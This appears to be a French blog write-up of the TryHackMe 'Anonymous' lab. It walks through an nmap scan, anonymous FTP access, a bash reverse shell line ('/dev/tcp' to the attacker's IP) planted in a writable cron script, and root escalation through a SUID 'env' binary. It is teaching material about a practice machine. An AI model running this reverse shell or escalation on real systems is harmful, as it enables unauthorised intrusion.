<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        üìô Anonymous ::
        infosec blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Recon Foothold Privilege Escalation anonymous.thm # Difficulty: Medium OS: Linux Description: Not the hacking group Link: https://tryhackme.com/room/anonymous Note # Room sympa mais tr√®s facile, en plus guid√©e donc elle ne m√©rite pas vraiment son medium
Recon # nmap -A anonymous.thm Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-24 18:05 CET Nmap scan report for anonymous.thm (10.10.116.98) Host is up (0.11s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2."
/>
<meta
  name="keywords"
  content="rami malek"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/thm-writeups/anonymous/" />


<meta name="description" content="un blog sur lequel vous pourrez retrouver des writeups et des posts explicatifs en fran√ßais et en anglais">




<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="üìô Anonymous"/>
<meta name="twitter:description" content="Vulnerable FTP - Bash Reverse Shell - SUID Binary"/>



<meta property="og:title" content="üìô Anonymous" />
<meta property="og:description" content="Vulnerable FTP - Bash Reverse Shell - SUID Binary" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/thm-writeups/anonymous/" /><meta property="article:section" content="thm-writeups" />
<meta property="article:published_time" content="2022-12-27T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-27T00:00:00+00:00" /><meta property="og:site_name" content="infosec blog" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >c0nfl1c7</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">
            writeups
            <span class="menu__sub-inner-more-trigger-icon"
              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span
            >
          </li>
          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/htb-writeups/">HTB Writeups</a></li>
              
            
              
                <li><a href="/thm-writeups/">THM Writeups</a></li>
              
            
          </ul>
        </ul>
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="/htb-writeups/">HTB Writeups</a></li>
      
    
      
        <li><a href="/thm-writeups/">THM Writeups</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">üìô Anonymous</h1>
    <div class="post-meta">
      
        <time class="post-date">
          27-12-2022
        </time>

        
      

      
        <span class="post-author"
          >‚Äî √©crit par conflict</span
        >


      
        <span class="post-read-time"
          >‚Äî 3 minute(s) de lecture</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <hr>
<ul>
<li><a href="#recon">Recon</a></li>
<li><a href="#foothold">Foothold</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
</ul>
<hr>
<h1 id="anonymousthm">
  anonymous.thm
  <a href="#anonymousthm" class="h-anchor" aria-hidden="true">#</a>
</h1>
<ul>
<li>Difficulty: Medium</li>
<li>OS: Linux</li>
<li>Description: <code>Not the hacking group</code></li>
<li>Link: <a href="https://tryhackme.com/room/anonymous">https://tryhackme.com/room/anonymous</a></li>
</ul>
<h1 id="note">
  Note
  <a href="#note" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>Room sympa mais tr√®s facile, en plus guid√©e donc elle ne m√©rite pas vraiment son medium</p>
<h1 id="recon">
  Recon
  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
</h1>
<pre tabindex="0"><code>nmap -A anonymous.thm
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Starting Nmap <span style="color:#ae81ff">7.80</span> ( https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">24</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">05</span> CET
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> anonymous<span style="color:#f92672">.</span>thm (<span style="color:#ae81ff">10.10.116.98</span>)
</span></span><span style="display:flex;"><span>Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.11</span>s latency)<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed ports
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp  open  ftp         vsftpd <span style="color:#ae81ff">2.0.8</span> <span style="color:#f92672">or</span> later
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ftp<span style="color:#f92672">-</span>anon: Anonymous FTP login allowed (FTP code <span style="color:#ae81ff">230</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_drwxrwxrwx    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">111</span>      <span style="color:#ae81ff">113</span>          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">04</span>  <span style="color:#ae81ff">2020</span> scripts [NSE: writeable]
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ftp<span style="color:#f92672">-</span>syst: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   STAT: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> FTP server status:
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      Connected to ::ffff:<span style="color:#ae81ff">10.9.36.40</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      Logged <span style="color:#f92672">in</span> <span style="color:#66d9ef">as</span> ftp
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      TYPE: ASCII
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      No session bandwidth limit
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      Session timeout <span style="color:#f92672">in</span> seconds <span style="color:#f92672">is</span> <span style="color:#ae81ff">300</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      Control connection <span style="color:#f92672">is</span> plain text
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      Data connections will be plain text
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      At session startup, client count was <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>      vsFTPd <span style="color:#ae81ff">3.0.3</span> <span style="color:#f92672">-</span> secure, fast, stable
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_End of status
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp  open  ssh         OpenSSH <span style="color:#ae81ff">7.6</span>p1 Ubuntu <span style="color:#ae81ff">4</span>ubuntu0<span style="color:#ae81ff">.3</span> (Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssh<span style="color:#f92672">-</span>hostkey: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#ae81ff">2048</span> <span style="color:#ae81ff">8</span>b:ca:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">62</span>:<span style="color:#ae81ff">1</span>c:<span style="color:#ae81ff">2</span>b:<span style="color:#ae81ff">23</span>:fa:<span style="color:#ae81ff">6</span>b:c6:<span style="color:#ae81ff">1</span>f:a8:<span style="color:#ae81ff">13</span>:fe:<span style="color:#ae81ff">1</span>c:<span style="color:#ae81ff">68</span> (RSA)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">95</span>:<span style="color:#ae81ff">89</span>:a4:<span style="color:#ae81ff">12</span>:e2:e6:ab:<span style="color:#ae81ff">90</span>:<span style="color:#ae81ff">5</span>d:<span style="color:#ae81ff">45</span>:<span style="color:#ae81ff">19</span>:ff:<span style="color:#ae81ff">41</span>:<span style="color:#ae81ff">5</span>f:<span style="color:#ae81ff">74</span>:ce (ECDSA)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  <span style="color:#ae81ff">256</span> e1:<span style="color:#ae81ff">2</span>a:<span style="color:#ae81ff">96</span>:a4:ea:<span style="color:#ae81ff">8</span>f:<span style="color:#ae81ff">68</span>:<span style="color:#ae81ff">8</span>f:cc:<span style="color:#ae81ff">74</span>:b8:f0:<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">72</span>:<span style="color:#ae81ff">70</span>:cd (ED25519)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn Samba smbd <span style="color:#ae81ff">3.</span>X <span style="color:#f92672">-</span> <span style="color:#ae81ff">4.</span>X (workgroup: WORKGROUP)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn Samba smbd <span style="color:#ae81ff">4.7.6</span><span style="color:#f92672">-</span>Ubuntu (workgroup: WORKGROUP)
</span></span><span style="display:flex;"><span>Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <span style="color:#f92672">&lt;</span>unknown<span style="color:#f92672">&gt;</span>, NetBIOS MAC: <span style="color:#f92672">&lt;</span>unknown<span style="color:#f92672">&gt;</span> (unknown)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> smb<span style="color:#f92672">-</span>os<span style="color:#f92672">-</span>discovery: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   OS: Windows <span style="color:#ae81ff">6.1</span> (Samba <span style="color:#ae81ff">4.7.6</span><span style="color:#f92672">-</span>Ubuntu)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   Computer name: anonymous
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   NetBIOS computer name: ANONYMOUS\x00
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   Domain name: \x00
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   FQDN: anonymous
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  System time: <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>T17:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">36</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> smb<span style="color:#f92672">-</span>security<span style="color:#f92672">-</span>mode: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   account_used: guest
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   authentication_level: user
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   challenge_response: supported
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  message_signing: disabled (dangerous, but default)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> smb2<span style="color:#f92672">-</span>security<span style="color:#f92672">-</span>mode: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#ae81ff">2.02</span>: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_    Message signing enabled but <span style="color:#f92672">not</span> required
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> smb2<span style="color:#f92672">-</span>time: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   date: <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>T17:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  start_date: N<span style="color:#f92672">/</span>A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed<span style="color:#f92672">.</span> Please report any incorrect results at https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> <span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#f92672">in</span> <span style="color:#ae81ff">27.67</span> seconds
</span></span></code></pre></div><p>Il n‚Äôy a pas de webserver (pas de port http), donc √ßa ne sert √† rien de lancer un <strong><strong><strong><strong>dirb</strong></strong></strong></strong></p>
<p>Une ligne du nmap est particuli√®rement importante:</p>
<p><code>üîé ftp-anon: Anonymous FTP login allowed (FTP code 230)</code></p>
<p>Elle indique qu‚Äôon peut se connecter au FTP en tant qu‚Äôanonymous (sans compte)</p>
<p>On se connecte donc avec cette commande:</p>
<p><code>‚å®Ô∏è ftp anonymous.thm</code></p>
<p>Lorsque que le serveur nous demmande notre <strong><strong><strong><strong>Name</strong></strong></strong></strong>, on entre <strong><strong><strong><strong><strong><strong><strong><strong><strong>anonymous</strong></strong></strong></strong></strong></strong></strong></strong></strong>, et n‚Äôimporte quel mot de passe</p>
<p>Une fois connect√©s, on peut lister les dossiers pr√©sents</p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446803-9d5476e6-5a10-4251-a9fe-f9d9c9a80efb.png" alt="2022-12-24-180919_650x310_scrot"></p>
<p>On voit le dossier <strong><strong><strong><strong><strong><strong><strong>scripts</strong></strong></strong></strong></strong></strong></strong>, on peut <strong><strong>cd</strong></strong> dedans et lister son contenu</p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446828-8aecb9f6-ca78-4b2e-9470-1af20d883245.png" alt="2022-12-24-181132_750x314_scrot"></p>
<p>Il y a donc trois fichiers dedans: <strong><strong><strong><strong><strong><strong><strong><strong>clean.sh</strong></strong></strong></strong></strong></strong></strong></strong>, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>removed_files.log</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> et <strong><strong><strong><strong><strong><strong><strong><strong><strong>to_do.txt</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>On peut aussi voir qu‚Äôon a la permission <strong><strong><strong><strong><strong>write</strong></strong></strong></strong></strong> sur clean.sh, ce qui veut dire qu‚Äôon va pouvoir modifier le fichier directement sur le serveur.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446833-35942bb1-9e1b-47db-8b85-9bf2cd44d052.png" alt="2022-12-24-182720_664x30_scrot"></p>
<h1 id="foothold">
  Foothold
  <a href="#foothold" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>On r√©cup√®re le fichier depuis le ftp, et on rajoute un reverse shell √† la premi√®re ligne</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sh -i &gt;&amp; /dev/tcp/10.9.36.40/9001 0&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>tmp_files<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>echo $tmp_files
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $tmp_files<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Running cleanup script:  nothing to delete&#34;</span> &gt;&gt; /var/ftp/scripts/removed_files.&gt;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> LINE in $tmp_files; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        rm -rf /tmp/$LINE <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>date<span style="color:#66d9ef">)</span><span style="color:#e6db74"> | Removed file /tmp/</span>$LINE<span style="color:#e6db74">&#34;</span> &gt;&gt; /var/ftp/scripts/re&gt;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><p>On upload le fichier sur le serveur avec la commande <strong><strong><strong>put</strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446845-a6fc0e65-a2c5-4945-968a-4c10c7e25ea1.png" alt="2022-12-24-182956_944x192_scrot"></p>
<p>Puis on lance notre netcat, et on attend la connection</p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446852-952e6dc2-bfe2-4116-a0f0-d7c062dac6aa.png" alt="2022-12-24-183016_507x432_scrot"></p>
<p>On a maintenant un acc√®s √† la machine, on peut stabiliser le shell rapidement comme ceci:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446859-67b25606-08fd-4832-b72c-8fa25cd02bc3.png" alt="2022-12-24-183049_495x106_scrot"></p>
<p>On peut cat le user.txt, et passer √† la privesc</p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a href="#privilege-escalation" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>Puisque on a pas le password de l‚Äôutilisateur <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>namelessone</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, on ne peut pas utiliser <strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong>, on va donc lister les fichiers avec le <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>setuid bit</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, via la commande</p>
<p><code>‚å®Ô∏è find / -perm -4000 2&gt;/dev/null</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446863-7ceef9d5-ff01-4ea7-b52d-9698d5950872.png" alt="2022-12-24-184044_227x84_scrot"></p>
<p>Beaucoup de r√©sultats, mais <strong><strong><strong>env</strong></strong></strong> attire mon attention puisqu‚Äôil existe un ‚Äúexploit‚Äù pour privesc via ce binaire, qu‚Äôon peut retrouver <a href="https://gtfobins.github.io/gtfobins/env/#suid">ici</a></p>
<p><code>‚å®Ô∏è env /bin/sh -p</code></p>
<p>Nous sommes maintenant root, on peut cat le root.txt dans <strong><strong><strong><strong><strong><strong><strong>/root/</strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/209446868-b471e4e6-48e4-467b-91a3-0704466d0bdf.png" alt="2022-12-24-184141_1401x341_scrot"></p>
<h6 id="back-to-top">
  <a href="#"><em>back to top</em></a>
  <a href="#back-to-top" class="h-anchor" aria-hidden="true">#</a>
</h6>

    </div>
    

    
      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">rami malek en personne</div>
      
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
